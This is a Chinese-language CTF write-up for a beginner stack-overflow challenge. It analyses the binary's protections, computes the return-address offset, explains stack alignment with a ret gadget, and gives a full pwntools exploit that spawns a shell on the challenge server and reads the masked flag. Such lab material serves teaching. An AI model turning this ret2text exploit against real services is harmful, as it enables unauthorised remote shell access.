### README--做题之前必看

#### 一、思路

```
x86-64 栈溢出
No Canary + No PIE + NX
read(0, buf, 256) 但 buf 只有 64 字节，溢出覆盖返回地址
偏移 = 64(buf) + 8(旧 rbp) = 72
后门函数 win() 内部直接 system("/bin/sh")
跳 win 会因为 rsp 16 字节不对齐导致 system 静默崩溃
栈上插一条 ret gadget 做跳板，对齐后再跳 win
```

保护：No Canary, No PIE, NX enabled, Partial RELRO

#### 二、分析

##### 2.1 查看文件类型和保护机制

```bash
file pwn
checksec pwn
```

<img src="附件\images\README--做题之前必看\Snipaste_2026-10-18_09-34-59.png" alt="Checksec">

- No Canary 可以覆盖返回地址
- No PIE    函数地址固定，可以硬编码
- NX        不能直接放 shellcode，需要 ret2text

##### 2.2 IDA 打开找后门函数

把 `pwn` 拖进 IDA64，等待分析完成

左侧 Functions 窗口直接列出所有函数，能看到 `win`，地址 `0x4011b6`

也可以 `Shift+F12` 打开字符串窗口，搜 `/bin/sh`，双击跳过去，再通过交叉引用（`X`）找到调用它的函数，就是 `win`

<img src="附件\images\README--做题之前必看\IDA找win.png" alt="IDA找 win" width=550>

##### 2.3  main

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  puts("[*] Please input payload:");
  printf("> ");
  read(0, buf, 0x100uLL);
  puts("[*] Payload received.");
  return 0;
}
```

`char buf[64]`
`read(0, buf, 0x100)` 一次读 256 字节，明显栈溢出


##### 2.4 计算偏移

从 buf 开头到返回地址的距离：

```
偏移 = 64 (buf) + 8 (旧 rbp) = 72 字节
```

##### 2.5 Win

双击 `win`，按 `F5`：

```c
int win()
{
  puts("[+] Congratulations! You are the best!");
  puts("[+] system(\"/bin/sh\")");
  return system("/bin/sh");
}
```

`win` 调用了 `system("/bin/sh")`
跳过去就能拿 shell，地址 `0x4011b6`

##### 2.6 栈对齐

x86-64 Linux 调用约定规定
调用函数时 rsp 必须是 16 字节对齐
从 main 的 ret 跳转到 win 时，rsp 差了 8 字节
找一个单独的 `ret` 指令作为跳板
先执行一次 ret 把 rsp 调整 8 字节，再跳转到 win

ret_gadget = 0x40101a

##### 2.7 构造 Exp

Payload  `填充 72 字节` + `ret gadget (8B)` + `win 地址 (8B)`


```python
from pwn import *

# 远程连接
io = remote("ctf.guetsec.cn", 30000) #这里填端口号

# 地址
win_addr   = 0x4011b6   # win函数
ret_gadget = 0x40101a   # 栈对齐
offset     = 72         # 偏移 = 64(buf) + 8(旧的rbp)

# 构造 payload
payload = b'A' * offset + p64(ret_gadget) + p64(win_addr)

# 发送 payload
io.recvuntil(b"payload:")  # 当程序输入payload: 之后再发送payload
io.sendline(payload)

io.interactive()  # 进入交互，把终端交给shell
```

```bash
python3 solve.py
```

进入交互

```bash
$ ls -a
flag XXX

$ cat flag
GUET{Today_Hope_You_Can_Learn_Kownledge_{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}}
```

#### 三、最终 Flag

```
GUET{Today_Hope_You_Can_Learn_Kownledge_{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}}
```
